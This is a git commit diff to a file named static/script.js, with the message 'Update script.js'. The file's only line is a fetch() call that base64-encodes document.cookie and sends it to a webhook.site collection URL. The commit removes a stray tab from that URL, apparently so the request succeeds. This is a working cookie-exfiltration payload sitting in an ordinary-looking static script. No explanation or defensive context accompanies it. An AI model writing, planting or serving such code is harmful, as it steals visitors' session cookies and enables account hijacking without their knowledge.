331950a9d0e623ee67e0c599832c5b4fcf60af2f
ooAnita <ooanitaanitaoo@gmail.com>
2025-08-11 20:42:52 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch("	https://webhook.site/9804ff19-7e5c-487f-9172-7a1808c4d132/foo?"+window.btoa(document.cookie))
+fetch("https://webhook.site/9804ff19-7e5c-487f-9172-7a1808c4d132/foo?"+window.btoa(document.cookie))
